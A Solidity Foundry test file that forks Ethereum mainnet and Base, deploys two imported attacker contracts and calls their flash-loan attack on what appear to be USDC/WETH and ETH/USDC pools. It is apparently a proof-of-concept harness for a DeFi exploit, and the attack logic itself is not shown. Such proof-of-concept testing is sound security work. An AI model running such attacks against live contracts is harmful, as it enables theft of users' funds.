// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {USDC_WETH30bpsMainnetAttacker} from "./USDC_WETH30bpsMainnetAttacker.sol";
import {ETH_USDC5bpsBaseAttacker} from "./ETH_USDC5bpsBaseAttacker.sol";

contract MakingFakeTokenIdListPassTest is Test {

    function setUp() public {}

    function testTakeFlashLoanAndAttack_USDC_WETH30bpsMainnetAttacker() public {
        vm.createSelectFork("mainnet");

        // Deploy with CREATE2 for deterministic address
        bytes32 salt = bytes32(uint256(0x123));

        USDC_WETH30bpsMainnetAttacker template;
        USDC_WETH30bpsMainnetAttacker attacker;
        attacker = new USDC_WETH30bpsMainnetAttacker{salt: salt}();

        console.log("Attacker deployed at:", address(attacker));

        // Run the attack
        attacker.takeFlashLoanAndAttack();
    }

    function testTakeFlashLoanAndAttack_ETH_USDC5bpsBaseAttacker() public {
        vm.createSelectFork("base");

        // Deploy with CREATE2 for deterministic address
        bytes32 salt = bytes32(uint256(0x123));

        ETH_USDC5bpsBaseAttacker template;
        ETH_USDC5bpsBaseAttacker attacker;
        attacker = new ETH_USDC5bpsBaseAttacker{salt: salt}();

        console.log("Attacker deployed at:", address(attacker));

        // Run the attack
        attacker.takeFlashLoanAndAttack();
    }
}
